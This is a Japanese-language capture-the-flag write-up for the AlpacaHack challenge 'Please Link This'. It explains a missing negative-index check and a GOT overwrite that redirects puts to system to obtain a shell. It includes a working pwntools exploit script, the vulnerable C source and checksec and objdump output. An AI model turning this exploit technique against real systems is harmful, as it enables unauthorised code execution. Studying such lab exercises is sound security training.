# ■ Writeup::Please Link This
[Please Link This - AlpacaHack](https://alpacahack.com/challenges/please-link-this)

# 1. Solution

- `pos` に対しての負の値のチェックがされていない.
- RELROが `Partial RELRO` となっており, `got.plt` を書き換え可能.
- `puts()` 内で文字列 `'/bin/sh'` が存在している.

これらを組み合わせて, GOT Overwriteにより `puts@got` を `system@plt` に書き換え, `/bin/sh` を実行させる.

- `solve.py:
```python
from pwn import *
import re

_, HOST, PORT = 'nc localhost 9999'.split()
io = remote(HOST, PORT)

elf = ELF('./chal')

puts_got = elf.got['puts'] # 0x404000
system_plt = elf.plt['system'] # 0x4010a0
values = elf.symbols['values'] # 0x404060
print(f'[*] puts@glt: {hex(puts_got)}')
print(f'[*] system@plt: {hex(system_plt)}')
print(f'[*] values: {hex(values)}')

pos = (puts_got - values) // 8 # -12
io.sendlineafter(b'> ', str(pos).encode()) # pos >
io.sendlineafter(b'> ', str(system_plt).encode()) # val >

io.sendline(b'cat flag.txt')
flag = io.recvregex(b'Alpaca{.+}').decode()
flag = re.search(r'Alpaca{.+}', flag).group()
print(f'[+] Flag: {flag}')
```

# 2. Explanation

- `chal.c`:
```C
 1	// gcc chal.c -o chal -no-pie
 2	
 3	#include <stdio.h>
 4	#include <stdlib.h>
 5	
 6	long values[100], pos;
 7	
 8	int main(void) {
 9	    system("figlet \"Welcome Hackers\"");
10	    printf("pos > ");
11	    scanf("%ld", &pos);
12	    if (pos >= 100) {
13	        puts("You're a hacker!");
14	        return 1;
15	    }
16	    printf("val > ");
17	    scanf("%ld", &values[pos]);
18	
19	    puts("/bin/sh; is this what you need?");
20	}
21	
22	__attribute__((constructor))
23	void setup() {
24	    setbuf(stdin,NULL);
25	    setbuf(stdout,NULL);
26	}
```

## 2.1. `pos` のアサーション

```C
12	    if (pos >= 100) {
13	        puts("You're a hacker!");
14	        return 1;
15	    }
```

負の値の入力に対してチェックされていない.

## 2.2. `Partial RELRO`, GOT Overwrite

```bash
$ pwn checksec ./chal
[*] '/home/arch/alpacahack/please-link-this/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

RELRO(RELocation Read-Only)が `Partial RELRO` となっており, 非PLT(Procedure Linkage Table)である `.got` 領域はRead-Onlyであるが, `.got.plt` がWritableである.

これを用いて, `puts@got` を `system@plt` に書き換えることで `puts()` の動作を `system()` の動作に置き換えられる.

- GOTが解決された `puts@got` のaddress:
```bash
$ objdump -R ./chal | grep "puts"
0000000000404000 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

- `system@plt` のaddress:
```bash
$ objdump -d ./chal | grep "system@plt"
00000000004010a0 <system@plt>:
  4011c8:       e8 d3 fe ff ff          call   4010a0 <system@plt>
```

## 2.3. `values` から `puts@got` へのoffset

- `values` のaddress:
```bash
 readelf -s ./chal | grep "\svalues"
    24: 0000000000404060   800 OBJECT  GLOBAL DEFAULT   26 values
```

2.2. の情報も踏まえて, `values` から `puts@get` へのoffsetは以下で求まる.

```python
>>> 0x404000 - 0x404060
-96
```

`pos` は `long` 型であり8byteなので, -96を8で除算することで `pos` に渡す値がわかる.
